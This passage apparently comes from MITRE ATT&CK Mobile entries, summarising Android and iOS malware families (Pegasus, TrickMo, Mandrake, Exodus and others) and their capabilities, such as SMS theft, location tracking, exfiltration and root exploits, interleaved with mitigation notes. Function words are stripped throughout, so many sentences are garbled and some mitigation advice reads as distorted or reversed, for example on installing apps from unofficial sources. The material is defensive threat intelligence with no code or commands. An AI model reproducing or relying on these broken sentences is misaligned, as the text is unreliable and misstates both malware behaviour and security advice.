securelist rotexy 2018) [Stealth Mango](https://attack.mitre.org/software/S0328) Android malware reportedly compromise mobile devices government officials, military, medical professionals, civilians. iOS malware [Tangelo](https://attack.mitre.org/software/S0329) believed developer. (Citation: Lookout-StealthMango) [Allwinner](https://attack.mitre.org/software/S0319) company supplies processors Android tablets devices. Linux kernel distributed [Allwinner](https://attack.mitre.org/software/S0319) devices reportedly contained backdoor. (Citation: HackerNews-Allwinner) [GoldenEagle](https://attack.mitre.org/software/S0551) piece Android malware targeting Uyghurs, Muslims, Tibetans, individuals Turkey, individuals China. Samples 2012.(Citation: Lookout Uyghur Campaign) [Bread](https://attack.mitre.org/software/S0432) large-scale billing fraud malware family employing cloaking obfuscation techniques attempt continuously evade Google Play Store’s malware detection. 1,700 unique Bread apps detected removed Google Play Store downloaded users.(Citation: Google Bread) [Judy](https://attack.mitre.org/software/S0325) auto-clicking adware distributed multiple apps Google Play Store. (Citation: CheckPoint-Judy) [OldBoot](https://attack.mitre.org/software/S0285) Android malware family. (Citation: HackerNews-OldBoot) [Gooligan](https://attack.mitre.org/software/S0290) malware family runs privilege escalation exploits Android devices escalated privileges steal authentication tokens access data Google applications. [Gooligan](https://attack.mitre.org/software/S0290) Ghost Push Android malware family. (Citation: Gooligan Citation) (Citation: Ludwig-GhostPush) (Citation: Lookout-Gooligan) [SpyNote RAT](https://attack.mitre.org/software/S0305) (Remote Access Trojan) family malicious Android apps. [SpyNote RAT](https://attack.mitre.org/software/S0305) builder tool develop malicious apps malware's functionality. (Citation: Zscaler-SpyNote) [TrickMo](https://attack.mitre.org/software/S0427) 2FA bypass mobile banking trojan, distributed [TrickBot](https://attack.mitre.org/software/S0266). [TrickMo](https://attack.mitre.org/software/S0427) targeting users located Germany.(Citation: SecurityIntelligence TrickMo)

[TrickMo](https://attack.mitre.org/software/S0427) designed steal transaction authorization (TANs), typically one-time passwords.(Citation: SecurityIntelligence TrickMo)  [INSOMNIA](https://attack.mitre.org/software/S0463) spyware Evil Eye.(Citation: Volexity Insomnia) [Dvmap](https://attack.mitre.org/software/S0420) rooting malware injects malicious code runtime libraries. credited malware performs type code injection.(Citation: SecureList DVMap June 2017) [Zen](https://attack.mitre.org/software/S0494) Android malware 2013.(Citation: Google Security Zen) [NotCompatible](https://attack.mitre.org/software/S0299) Android malware family 2014 2016. multiple variants sophisticated time. (Citation: Lookout-NotCompatible) [XLoader Android](https://attack.mitre.org/software/S0318) malicious Android app observed targeting Japan, Korea, China, Taiwan, Hong Kong 2018. observed targeting South Korean users pornography application.(Citation: TrendMicro-XLoader-FakeSpy)(Citation: TrendMicro-XLoader) tracked separately [XLoader iOS](https://attack.mitre.org/software/S0490). [Trojan-SMS.AndroidOS.FakeInst.a](https://attack.mitre.org/software/S0306) Android malware. (Citation: Kaspersky-MobileMalware) [XLoader iOS](https://attack.mitre.org/software/S0490) malicious iOS application capable gathering information.(Citation: TrendMicro-XLoader-FakeSpy) tracked separately [XLoader Android](https://attack.mitre.org/software/S0318). [Exodus](https://attack.mitre.org/software/S0405) Android spyware deployed distinct stages named Exodus (dropper) Exodus (payload).(Citation: SWB Exodus March 2019) [Dendroid](https://attack.mitre.org/software/S0301) Android remote access tool (RAT) targeting Western countries. RAT purchase $300 bundled utility inject RAT legitimate applications.(Citation: Lookout-Dendroid) [WireLurker](https://attack.mitre.org/software/S0312) family macOS malware targets iOS devices connected USB. (Citation: PaloAlto-WireLurker) [Desert Scorpion](https://attack.mitre.org/software/S0505) surveillanceware targeted Middle East, individuals located Palestine. [Desert Scorpion](https://attack.mitre.org/software/S0505) suspected operated threat actor APT-C-23.(Citation: Lookout Desert Scorpion)  [Pegasus iOS](https://attack.mitre.org/software/S0289) iOS version malware reportedly linked NSO Group. advertised sold target high-value victims. (Citation: Lookout-Pegasus) (Citation: PegasusCitizenLab) Android version tracked separately [Pegasus Android](https://attack.mitre.org/software/S0316). [Tangelo](https://attack.mitre.org/software/S0329) iOS malware believed developers [Stealth Mango](https://attack.mitre.org/software/S0328) Android malware. mobile application, Debian package jailbroken iOS devices. (Citation: Lookout-StealthMango) [RCSAndroid](https://attack.mitre.org/software/S0295) Android malware. (Citation: TrendMicro-RCSAndroid) [Corona Updates](https://attack.mitre.org/software/S0425) Android spyware advantage Coronavirus pandemic. campaign distributing spyware tracked Project Spy. Multiple variants spyware discovered hosted Google Play Store.(Citation: TrendMicro Coronavirus Updates) [Skygofree](https://attack.mitre.org/software/S0327) Android spyware believed developed 2014 2017. (Citation: Kaspersky-Skygofree) [KeyRaider](https://attack.mitre.org/software/S0288) malware steals Apple account credentials data jailbroken iOS devices. ransomware functionality. (Citation: Xiao-KeyRaider) [ZergHelper](https://attack.mitre.org/software/S0287) iOS riskware unique apparent evasion Apple's App Store review process. malicious functionality identified app, security risks. (Citation: Xiao-ZergHelper) [DoubleAgent](https://attack.mitre.org/software/S0550) family RAT malware dating 2013, target contentious relationships Chinese government.(Citation: Lookout Uyghur Campaign) [Twitoor](https://attack.mitre.org/software/S0302) dropper application capable receiving commands social media.(Citation: ESET-Twitoor) [ANDROIDOS_ANSERVER.A](https://attack.mitre.org/software/S0310) Android malware unique encrypted content blog command control. (Citation: TrendMicro-Anserver) [DualToy](https://attack.mitre.org/software/S0315) Windows malware installs malicious applications Android iOS devices connected USB. (Citation: PaloAlto-DualToy) [Mandrake](https://attack.mitre.org/software/S0485) sophisticated Android espionage platform active wild 2016. [Mandrake](https://attack.mitre.org/software/S0485) actively maintained, sophisticated features attacks executed surgical precision.

[Mandrake](https://attack.mitre.org/software/S0485) undetected providing legitimate, ad-free applications social media real reviews apps. malware activated operators issue specific command.(Citation: Bitdefender Mandrake) [X-Agent Android](https://attack.mitre.org/software/S0314) Android malware repackaged version Ukrainian artillery targeting application. malware reportedly retrieved location data victim device used, potential location Ukrainian artillery. (Citation: CrowdStrike-Android) tracked separately [CHOPSTICK](https://attack.mitre.org/software/S0023). [DEFENSOR ID](https://attack.mitre.org/software/S0479) banking trojan capable clearing victim’s bank account cryptocurrency wallet email social media accounts. [DEFENSOR ID](https://attack.mitre.org/software/S0479) performs majority malicious functionality abusing Android’s accessibility service.(Citation: ESET DEFENSOR ID)  [MazarBOT](https://attack.mitre.org/software/S0303) Android malware distributed SMS Denmark 2016. (Citation: Tripwire-MazarBOT) [Ginp](https://attack.mitre.org/software/S0423) Android banking trojan target Spanish banks. code [Anubis](https://attack.mitre.org/software/S0422).(Citation: ThreatFabric Ginp) [HummingWhale](https://attack.mitre.org/software/S0321) Android malware family performs fraud. (Citation: ArsTechnica-HummingWhale) [eSurv](https://attack.mitre.org/software/S0507) mobile surveillanceware designed lawful intercept market developed years.(Citation: Lookout eSurv) [Monokle](https://attack.mitre.org/software/S0407) targeted, sophisticated mobile surveillanceware. developed Android, code artifacts suggests iOS version development.(Citation: Lookout-Monokle) [Red Alert 2.0](https://attack.mitre.org/software/S0539) banking trojan masquerades VPN client.(Citation: Sophos Red Alert 2.0)  [ViceLeaker](https://attack.mitre.org/software/S0418) spyware framework, capable extensive surveillance data exfiltration operations, targeting devices belonging Israeli citizens.(Citation: SecureList - ViceLeaker 2019)(Citation: Bitdefender - Triout 2018) [FakeSpy](https://attack.mitre.org/software/S0509) Android spyware operated Chinese threat actor Roaming Mantis campaigns.(Citation: Cybereason FakeSpy) [SpyDealer](https://attack.mitre.org/software/S0324) Android malware exfiltrates sensitive data Android devices. (Citation: PaloAlto-SpyDealer) [Concipit1248](https://attack.mitre.org/software/S0426) iOS spyware discovered developer Android spyware [Corona Updates](https://attack.mitre.org/software/S0425). investigation revealed pieces software contained C2 URL functionality.(Citation: TrendMicro Coronavirus Updates) [RuMMS](https://attack.mitre.org/software/S0313) Android malware family. (Citation: FireEye-RuMMS) [Pegasus Android](https://attack.mitre.org/software/S0316) Android version malware reportedly linked NSO Group. (Citation: Lookout-PegasusAndroid) (Citation: Google-Chrysaor) iOS version tracked separately [Pegasus iOS](https://attack.mitre.org/software/S0289). [FrozenCell](https://attack.mitre.org/software/S0577) mobile component family surveillanceware, desktop component KasperAgent [Micropsia](https://attack.mitre.org/software/S0339).(Citation: Lookout FrozenCell) [AndroidOS/MalLocker.B](https://attack.mitre.org/software/S0524) variant ransomware family targeting Android devices. prevents user interacting UI displaying screen ransom note windows. (Citation: MalLockerB) [RedDrop](https://attack.mitre.org/software/S0326) Android malware family exfiltrates sensitive data devices. (Citation: Wandera-RedDrop) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) modular backdoor deployed [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: CYBERWARCON CHEMISTGAMES) [YiSpecter](https://attack.mitre.org/software/S0311) iOS malware jailbroken non-jailbroken iOS devices. unique abuses private APIs iOS implement functionality. (Citation: PaloAlto-YiSpecter) [Trojan-SMS.AndroidOS.Agent.ao](https://attack.mitre.org/software/S0307) Android malware. (Citation: Kaspersky-MobileMalware) [Anubis](https://attack.mitre.org/software/S0422) Android malware originally cyber espionage, retooled banking trojan.(Citation: Cofense Anubis) [AndroRAT](https://attack.mitre.org/software/S0292) malware party control device collect information. (Citation: Lookout-EnterpriseApps) [Agent Smith](https://attack.mitre.org/software/S0440) mobile malware generates financial gain replacing legitimate applications devices malicious versions include fraudulent ads. July 2019 [Agent Smith](https://attack.mitre.org/software/S0440) infected 25 devices, targeting India effects observed Asian countries Saudi Arabia, United Kingdom, United States.(Citation: CheckPoint Agent Smith) [Asacub](https://attack.mitre.org/software/S0540) banking trojan attempts steal money victims’ bank accounts. attempts initiating wire transfer SMS message compromised devices.(Citation: Securelist Asacub) [GPlayed](https://attack.mitre.org/software/S0536) Android trojan broad range capabilities.(Citation: Talos GPlayed)  [EventBot](https://attack.mitre.org/software/S0478) Android banking trojan stealer abuses Android’s accessibility service steal data applications.(Citation: Cybereason EventBot) [EventBot](https://attack.mitre.org/software/S0478) designed target 200 banking financial applications, majority European bank cryptocurrency exchange applications.(Citation: Cybereason EventBot) [HenBox](https://attack.mitre.org/software/S0544) Android malware attempts execute Xiaomi devices running MIUI operating system. [HenBox](https://attack.mitre.org/software/S0544) target Uyghurs, minority Turkic ethnic group.(Citation: Palo Alto HenBox) [Riltok](https://attack.mitre.org/software/S0403) banking malware phishing popups collect user credentials.(Citation: Kaspersky Riltok June 2019) [GolfSpy](https://attack.mitre.org/software/S0421) Android spyware deployed [Bouncing Golf](https://attack.mitre.org/groups/G0097).(Citation: Trend Micro Bouncing Golf 2019) [Pallas](https://attack.mitre.org/software/S0399) mobile surveillanceware custom-developed [Dark Caracal](https://attack.mitre.org/groups/G0070).(Citation: Lookout Dark Caracal Jan 2018) [Circles](https://attack.mitre.org/software/S0602) reportedly takes advantage Signaling 7 (SS7) weaknesses, protocol suite route phone calls, track location mobile devices intercept voice calls SMS messages. connected telecommunications company’s infrastructure purchased cloud service. Circles reportedly linked NSO Group.(Citation: CitizenLab Circles) [Tiktok Pro](https://attack.mitre.org/software/S0558) spyware masquerading TikTok application.(Citation: Zscaler TikTok Spyware) [PJApps](https://attack.mitre.org/software/S0291) Android malware family. (Citation: Lookout-EnterpriseApps) [ShiftyBug](https://attack.mitre.org/software/S0294) auto-rooting adware family malware Android. family Android families Shedun, Shuanet, Kemoge, believed families created group. (Citation: Lookout-Adware) [HummingBad](https://attack.mitre.org/software/S0322) family Android malware generates fraudulent advertising revenue ability root access older, vulnerable versions Android. (Citation: ArsTechnica-HummingBad) [Exobot](https://attack.mitre.org/software/S0522) Android banking malware, targeting financial institutions Germany, Austria, France.(Citation: Threat Fabric Exobot) OBAD Android malware family. (Citation: TrendMicro-Obad) [Android/Chuli.A](https://attack.mitre.org/software/S0304) Android malware delivered activist spearphishing email attachment. (Citation: Kaspersky-WUC) [Charger](https://attack.mitre.org/software/S0323) Android malware steals steals contacts SMS messages user's device. lock device demand ransom payment receives admin permissions. (Citation: CheckPoint-Charger) [Trojan-SMS.AndroidOS.OpFake.a](https://attack.mitre.org/software/S0308) Android malware. (Citation: Kaspersky-MobileMalware) [XcodeGhost](https://attack.mitre.org/software/S0297) iOS malware infected iOS apps 2015 millions users. (Citation: PaloAlto-XcodeGhost1) (Citation: PaloAlto-XcodeGhost) [SilkBean](https://attack.mitre.org/software/S0549) piece Android surveillanceware comprehensive remote access tool (RAT) functionality targeting Uyghur ethnic group.(Citation: Lookout Uyghur Campaign) [WolfRAT](https://attack.mitre.org/software/S0489) malware based leaked version [Dendroid](https://attack.mitre.org/software/S0301) targeted Thai users. [WolfRAT](https://attack.mitre.org/software/S0489) operated defunct organization Wolf Research.(Citation: Talos-WolfRAT)  [BusyGasper](https://attack.mitre.org/software/S0655) Android spyware 2016. victims, located Russia, infected physical access device.(Citation: SecureList BusyGasper) [BrainTest](https://attack.mitre.org/software/S0293) family Android malware. (Citation: CheckPoint-BrainTest) (Citation: Lookout-BrainTest) [TERRACOTTA](https://attack.mitre.org/software/S0545) fraud botnet capable generating 2 fraudulent requests week.(Citation: WhiteOps TERRACOTTA) [Triada](https://attack.mitre.org/software/S0424) reported 2016 stage malware. versions 2019 appeared techniques initial downloader Trojan apps.(Citation: Kaspersky Triada March 2016) [Golden Cup](https://attack.mitre.org/software/S0535) Android spyware target Cup fans.(Citation: Symantec GoldenCup)  [ViperRAT](https://attack.mitre.org/software/S0506) sophisticated surveillanceware operation 2015 target Israeli Defense Force.(Citation: Lookout ViperRAT)  [Adups](https://attack.mitre.org/software/S0309) software pre-installed Android devices, including BLU Products. software reportedly designed Chinese phone manufacturer monitor user behavior, transferring sensitive data Chinese server. (Citation: NYTimes-BackDoor) (Citation: BankInfoSecurity-BackDoor) [SimBad](https://attack.mitre.org/software/S0419) strain adware Google Play Store, distributed RXDroider Software Development Kit. "SimBad" derived infected applications simulator games. adware controlled instance source framework Parse Server.(Citation: CheckPoint SimBad 2019) [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) variant adware distributed multiple apps Google Play Store. (Citation: WeLiveSecurity AdDisplayAshas) [Marcher](https://attack.mitre.org/software/S0317) Android malware financial fraud. (Citation: Proofpoint-Marcher) [DressCode](https://attack.mitre.org/software/S0300) Android malware family. (Citation: TrendMicro-DressCode) [Gustuff](https://attack.mitre.org/software/S0406) mobile malware designed steal users' banking virtual currency credentials.(Citation: Talos Gustuff Apr 2019) [SpyNote RAT](https://attack.mitre.org/software/S0305) Android broadcast receiver automatically start device boots.(Citation: Zscaler-SpyNote) [Triada](https://attack.mitre.org/software/S0424) utilizes backdoor Play Store app install additional trojanized apps Command Control server.(Citation: Google Triada June 2019) [GoldenEagle](https://attack.mitre.org/software/S0551) exfiltrated data SMTP HTTP.(Citation: Lookout Uyghur Campaign) [FakeSpy](https://attack.mitre.org/software/S0509) collect device networking information, including phone number, IMEI, IMSI.(Citation: Cybereason FakeSpy) [XLoader Android](https://attack.mitre.org/software/S0318) collects device’s Android serial number.(Citation: TrendMicro-XLoader-FakeSpy) [TrickMo](https://attack.mitre.org/software/S0427) registers `SCREEN_ON` `SMS_DELIVER` intents perform actions device unlocked device receives SMS message.(Citation: SecurityIntelligence TrickMo) Android 7 iOS versions introduced prevent applications performing Process Discovery elevated privileges.   [Desert Scorpion](https://attack.mitre.org/software/S0505) encrypt exfiltrated data.(Citation: Lookout Desert Scorpion) original variants [BrainTest](https://attack.mitre.org/software/S0293) capability automatically root devices, behavior observed samples.(Citation: Lookout-BrainTest) [BusyGasper](https://attack.mitre.org/software/S0655) abuse existing root access components partition.(Citation: SecureList BusyGasper)  [GoldenEagle](https://attack.mitre.org/software/S0551) looked .doc, .txt, .gif, .apk, .jpg, .png, .mp3, .db files external storage.(Citation: Lookout Uyghur Campaign) [EventBot](https://attack.mitre.org/software/S0478) encrypted base64-encoded payload data RC4 Curve25519.(Citation: Cybereason EventBot)  [ViceLeaker](https://attack.mitre.org/software/S0418) collect SMS messages.(Citation: SecureList - ViceLeaker 2019) user persistent notification recognize, uninstall source application unwanted applications anomalies. [BusyGasper](https://attack.mitre.org/software/S0655) download files commands FTP server exfiltrate data email.(Citation: SecureList BusyGasper) [Pallas](https://attack.mitre.org/software/S0399) retrieves messages decryption popular messaging applications accounts stored device.(Citation: Lookout Dark Caracal Jan 2018) Android introduced prevent malicious applications suppressing icon launcher.(Citation: Android Limitations Hiding App Icons)(Citation: LauncherApps getActivityList) [SilkBean](https://attack.mitre.org/software/S0549) access device contacts.(Citation: Lookout Uyghur Campaign) locked bootloader prevent unauthorized modifications protected operating files.   [Dvmap](https://attack.mitre.org/software/S0420) download code binaries C2 server execute device root.(Citation: SecureList DVMap June 2017) [Desert Scorpion](https://attack.mitre.org/software/S0505) controlled SMS messages.(Citation: Lookout Desert Scorpion) [KeyRaider](https://attack.mitre.org/software/S0288) samples search Apple account's username, password device's GUID data transferred.(Citation: Xiao-KeyRaider) [Tangelo](https://attack.mitre.org/software/S0329) functionality gather SMS messages.(Citation: Lookout-StealthMango) [HenBox](https://attack.mitre.org/software/S0544) collected outgoing phone start “86”.(Citation: Palo Alto HenBox) [Skygofree](https://attack.mitre.org/software/S0327) record audio microphone infected device location.(Citation: Kaspersky-Skygofree) [Monokle](https://attack.mitre.org/software/S0407) controlled email SMS set "control phones."(Citation: Lookout-Monokle) [Golden Cup](https://attack.mitre.org/software/S0535) collect pieces device information, serial product information.(Citation: Symantec GoldenCup) [ViperRAT](https://attack.mitre.org/software/S0506) installed stages secretly install applications.(Citation: Lookout ViperRAT) [WireLurker](https://attack.mitre.org/software/S0312) monitors iOS devices connected USB infected OSX installs downloaded third-party applications automatically generated malicious applications device.(Citation: PaloAlto-WireLurker) Users trained device administrator permission request prompts like, avoid granting permissions phishing popups. [TERRACOTTA](https://attack.mitre.org/software/S0545) stored encoded strings.(Citation: WhiteOps TERRACOTTA)   [Exodus](https://attack.mitre.org/software/S0405) exfiltrate calendar events.(Citation: SWB Exodus March 2019)  Developers Android App Links(Citation: Android App Links) iOS Universal Links(Citation: iOS Universal Links) provide secure binding URIs applications, preventing malicious applications intercepting redirections. Additionally, OAuth cases, PKCE(Citation: IETF-PKCE) prevent stolen authorization codes.  [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) generate revenue automatically displaying ads.(Citation: WeLiveSecurity AdDisplayAshas) [Dvmap](https://attack.mitre.org/software/S0420) replaces `/system/bin/ip` malicious version. [Dvmap](https://attack.mitre.org/software/S0420) inject code patching `libdmv.so` `libandroid_runtime.so`, depending Android OS version. libraries Dalvik ART runtime environments. patched functions `/system/bin/ip`, replaced malicious version.(Citation: SecureList DVMap June 2017) [GPlayed](https://attack.mitre.org/software/S0536) communicated C2 requests WebSockets backup.(Citation: Talos GPlayed)  [INSOMNIA](https://attack.mitre.org/software/S0463) collect device’s name, serial number, iOS version, total disk space, disk space.(Citation: Google Project Insomnia)   [TERRACOTTA](https://attack.mitre.org/software/S0545) included native modules.(Citation: WhiteOps TERRACOTTA) [Corona Updates](https://attack.mitre.org/software/S0425) send SMS messages.(Citation: TrendMicro Coronavirus Updates) [DEFENSOR ID](https://attack.mitre.org/software/S0479) abuse accessibility service read displayed screen.(Citation: ESET DEFENSOR ID) [Gustuff](https://attack.mitre.org/software/S0406) obfuscated command custom base85-based encoding.(Citation: Talos Gustuff Apr 2019) [Bread](https://attack.mitre.org/software/S0432) payloads commercially packers.(Citation: Google Bread) [Desert Scorpion](https://attack.mitre.org/software/S0505) distributed multiple stages.(Citation: Lookout Desert Scorpion) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) fingerprinted devices uniquely identify them.(Citation: CYBERWARCON CHEMISTGAMES) [INSOMNIA](https://attack.mitre.org/software/S0463) exploits WebKit vulnerability achieve root access device.(Citation: Volexity Insomnia) [AndroidOS/MalLocker.B](https://attack.mitre.org/software/S0524) registered receive 14 broadcast intents automatically triggering malware payloads. (Citation: MalLockerB) [Mandrake](https://attack.mitre.org/software/S0485) access device’s contact list.(Citation: Bitdefender Mandrake) [Stealth Mango](https://attack.mitre.org/software/S0328) record pictures cameras.(Citation: Lookout-StealthMango) [Cerberus](https://attack.mitre.org/software/S0480) communicates C2 requests port 8888.(Citation: CheckPoint Cerberus) [GolfSpy](https://attack.mitre.org/software/S0421) record video.(Citation: Trend Micro Bouncing Golf 2019) [Pegasus Android](https://attack.mitre.org/software/S0316) ability record device audio.(Citation: Lookout-PegasusAndroid) partition integrity mechanisms, Verified Boot, detect unauthorized modification files. [DoubleAgent](https://attack.mitre.org/software/S0550) hidden app icon.(Citation: Lookout Uyghur Campaign) [FrozenCell](https://attack.mitre.org/software/S0577) online cell tower geolocation service track targets.(Citation: Lookout FrozenCell)   [EventBot](https://attack.mitre.org/software/S0478) communicates C2 requests.(Citation: Cybereason EventBot) [BrainTest](https://attack.mitre.org/software/S0293) root privileges (if available) additional Android app package (APK) /system/priv-app maintain persistence factory reset.(Citation: Lookout-BrainTest) [INSOMNIA](https://attack.mitre.org/software/S0463) track device’s location.(Citation: Google Project Insomnia) [Tiktok Pro](https://attack.mitre.org/software/S0558) launch fake Facebook login page.(Citation: Zscaler TikTok Spyware) [SpyNote RAT](https://attack.mitre.org/software/S0305) collects device's location.(Citation: Zscaler-SpyNote) [GoldenEagle](https://attack.mitre.org/software/S0551) modified configured proxy information.(Citation: Lookout Uyghur Campaign)  Samsung Knox, third-party keyboards explicitly list end-user.(Citation: Samsung Keyboards) EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method set explicit list applications allowed Android's accessibility features.  [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) check device IP range Google IP addresses triggering payload delay payload deployment avoid detection testing avoid association unwanted ads.(Citation: WeLiveSecurity AdDisplayAshas) [eSurv](https://attack.mitre.org/software/S0507) imposes geo-restrictions delivering stage.(Citation: Lookout eSurv) [Exodus](https://attack.mitre.org/software/S0405) encrypts data XOR prior exfiltration.(Citation: SWB Exodus March 2019)  [BusyGasper](https://attack.mitre.org/software/S0655) controlled IRC freenode.net servers.(Citation: SecureList BusyGasper) [Monokle](https://attack.mitre.org/software/S0407) XOR obfuscate stage binary.(Citation: Lookout-Monokle) [Xbot](https://attack.mitre.org/software/S0298) remotely lock infected Android devices ransom.(Citation: PaloAlto-Xbot) [Riltok](https://attack.mitre.org/software/S0403) query device's IMEI.(Citation: Kaspersky Riltok June 2019) Typically, insecure malicious configuration settings installed user's consent. Users advised install unexpected configuration settings (CA certificates, iOS Configuration Profiles, Mobile Device Management server provisioning).  [Pallas](https://attack.mitre.org/software/S0399) phishing popups harvest user credentials.(Citation: Lookout Dark Caracal Jan 2018) [TERRACOTTA](https://attack.mitre.org/software/S0545) generated non-human advertising impressions.(Citation: WhiteOps TERRACOTTA) Filtering requests checking request origin provide defense spurious operators.(Citation: CSRIC-WG1-FinalReport)  [Zen](https://attack.mitre.org/software/S0494) install partition achieve persistence. [Zen](https://attack.mitre.org/software/S0494) replace `framework.jar`, intercept modify behavior standard Android API.(Citation: Google Security Zen) Security updates patches vulnerabilities. [XcodeGhost](https://attack.mitre.org/software/S0297) prompt fake alert dialog phish user credentials.(Citation: PaloAlto-XcodeGhost) [RCSAndroid](https://attack.mitre.org/software/S0295) record audio device microphone.(Citation: TrendMicro-RCSAndroid) Apple regularly security updates OS vulnerabilities. [FakeSpy](https://attack.mitre.org/software/S0509) collect account stored device, data external storage.(Citation: Cybereason FakeSpy) [EventBot](https://attack.mitre.org/software/S0478) download libraries instructed to.(Citation: Cybereason EventBot) [eSurv](https://attack.mitre.org/software/S0507) record audio.(Citation: Lookout eSurv)  [Dendroid](https://attack.mitre.org/software/S0301) detect emulator.(Citation: Lookout-Dendroid) [DEFENSOR ID](https://attack.mitre.org/software/S0479) abuse accessibility service perform actions behalf user, including launching attacker-specified applications steal data.(Citation: ESET DEFENSOR ID) Security updates typically provide patches vulnerabilities enable device rooting. [TrickMo](https://attack.mitre.org/software/S0427) collect device network configuration IMSI, IMEI, Wi-Fi connection state.(Citation: SecurityIntelligence TrickMo) [BusyGasper](https://attack.mitre.org/software/S0655) collect images stored device browser history.(Citation: SecureList BusyGasper)  [ViperRAT](https://attack.mitre.org/software/S0506) collect device’s contact list.(Citation: Lookout ViperRAT) Users warned granting access accessibility features, carefully scrutinize applications request dangerous permission.  [HenBox](https://attack.mitre.org/software/S0544) intercept SMS messages.(Citation: Palo Alto HenBox) [Windshift](https://attack.mitre.org/groups/G0112) included contact list exfiltration malicious apps deployed Operation BULL.(Citation: BlackBerry Bahamut)  Android prevents applications accessing clipboard data application foreground set device’s default input method editor (IME).(Citation: Android Privacy Changes) [ShiftyBug](https://attack.mitre.org/software/S0294) auto-rooting adware embeds application, impossible remove.(Citation: Lookout-Adware) [Adups](https://attack.mitre.org/software/S0309) transmitted contents messages.(Citation: NYTimes-BackDoor)  Applications properly encrypt network traffic evade forms AiTM behavior.  [Pegasus Android](https://attack.mitre.org/software/S0316) listens `BOOT_COMPLETED` broadcast intent maintain persistence activate functionality device boot time.(Citation: Lookout-PegasusAndroid) iOS users instructed download applications unofficial sources, applications distributed Apple App Store list installed applications device. [Mandrake](https://attack.mitre.org/software/S0485) evade automated analysis environments requiring CAPTCHA launch prevent application running passed. checks indications running emulator.(Citation: Bitdefender Mandrake) [eSurv](https://attack.mitre.org/software/S0507)’s Android version public key encryption certificate pinning C2 communication.(Citation: Lookout eSurv) Android 11 up, users prompted option select “Allow time” navigate settings manually select option. iOS 14 up, users select provide Precise Location installed application.  [Desert Scorpion](https://attack.mitre.org/software/S0505) list installed applications.(Citation: Lookout Desert Scorpion) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) HTTPS C2 communication.(Citation: CYBERWARCON CHEMISTGAMES)  [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) collect device including device type, OS version, language, storage space, battery status, device root, *developer mode* enabled.(Citation: WeLiveSecurity AdDisplayAshas) [Judy](https://attack.mitre.org/software/S0325) infected devices generate fraudulent clicks advertisements generate revenue.(Citation: CheckPoint-Judy) [Bread](https://attack.mitre.org/software/S0432) collect device notifications.(Citation: Check Point-Joker) [Ginp](https://attack.mitre.org/software/S0423) determine running emulator.(Citation: ThreatFabric Ginp) [Xbot](https://attack.mitre.org/software/S0298) phishing mimicking Google Play's payment interface bank login pages.(Citation: PaloAlto-Xbot) [Bread](https://attack.mitre.org/software/S0432) access SMS messages complete carrier billing fraud.(Citation: Google Bread)   [Cerberus](https://attack.mitre.org/software/S0480) hides icon application drawer launched time.(Citation: Threat Fabric Cerberus) [Exodus](https://attack.mitre.org/software/S0405) extracts Facebook, Facebook Messenger, Gmail, IMO, Skype, Telegram, Viber, WhatsApp, WeChat.(Citation: SWB Exodus March 2019) [Golden Cup](https://attack.mitre.org/software/S0535) distributed stages.(Citation: Symantec GoldenCup) `HIDE_OVERLAY_WINDOWS` permission introduced Android 12 allowing apps hide overlay windows type `TYPE_APPLICATION_OVERLAY` drawn apps `SYSTEM_ALERT_WINDOW` permission, preventing applications creating overlay windows current application.(Citation: Android 12 Features) [BusyGasper](https://attack.mitre.org/software/S0655) hide icon.(Citation: SecureList BusyGasper) [Ginp](https://attack.mitre.org/software/S0423) collect SMS messages.(Citation: ThreatFabric Ginp) [Bread](https://attack.mitre.org/software/S0432) utilized JavaScript WebViews loaded URL hosted Bread-controlled server functions run. [Bread](https://attack.mitre.org/software/S0432) downloads billing fraud execution steps runtime.(Citation: Google Bread) [Anubis](https://attack.mitre.org/software/S0422) exfiltrate files encrypted ransomware module device modify external storage.(Citation: Cofense Anubis)(Citation: Trend Micro Anubis)  [WolfRAT](https://attack.mitre.org/software/S0489) sends device’s IMEI exfiltration request.(Citation: Talos-WolfRAT)  [RCSAndroid](https://attack.mitre.org/software/S0295) collect SMS, MMS, Gmail messages.(Citation: TrendMicro-RCSAndroid)  [DoubleAgent](https://attack.mitre.org/software/S0550) accessed contact list.(Citation: Lookout Uyghur Campaign) Users advised applications require permission send SMS messages. [HenBox](https://attack.mitre.org/software/S0544) detect app running emulator.(Citation: Palo Alto HenBox) [TERRACOTTA](https://attack.mitre.org/software/S0545) displayed form collect user data installation.(Citation: WhiteOps TERRACOTTA) [WolfRAT](https://attack.mitre.org/software/S0489) collect device’s log.(Citation: Talos-WolfRAT) [XLoader Android](https://attack.mitre.org/software/S0318) covertly records phone calls.(Citation: TrendMicro-XLoader) [DoubleAgent](https://attack.mitre.org/software/S0550) captured SMS MMS messages.(Citation: Lookout Uyghur Campaign) [Mandrake](https://attack.mitre.org/software/S0485) capture device notifications hide notifications user.(Citation: Bitdefender Mandrake) [TrickMo](https://attack.mitre.org/software/S0427) prevent user interacting UI WebView persistent cursor.(Citation: SecurityIntelligence TrickMo) [Tiktok Pro](https://attack.mitre.org/software/S0558) track device’s location.(Citation: Zscaler TikTok Spyware) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) HTTPS C2 communication.(Citation: CYBERWARCON CHEMISTGAMES) [Pallas](https://attack.mitre.org/software/S0399) retrieves list applications installed device.(Citation: Lookout Dark Caracal Jan 2018) [AndroidOS/MalLocker.B](https://attack.mitre.org/software/S0524) employed mangling meaningless variable names source. [AndroidOS/MalLocker.B](https://attack.mitre.org/software/S0524) stored encrypted payload code Assets directory, coupled custom decryption routine assembles .dex file passing data Android Intent objects. (Citation: MalLockerB) Mobile security software typically detect device rooted jailbroken inform user, action. Configuration per-app VPN policies device-wide VPN restrict access internal enterprise resource access VPN enterprise-approved applications [Mandrake](https://attack.mitre.org/software/S0485) foreground persistence service running. user transparent notification evade detection.(Citation: Bitdefender Mandrake) [SilkBean](https://attack.mitre.org/software/S0549) hidden malicious functionality stage file encrypted C2 server information.(Citation: Lookout Uyghur Campaign) [Dendroid](https://attack.mitre.org/software/S0301) intercept SMS messages.(Citation: Lookout-Dendroid) [Monokle](https://attack.mitre.org/software/S0407) retrieve nearby cell tower Wi-Fi network information.(Citation: 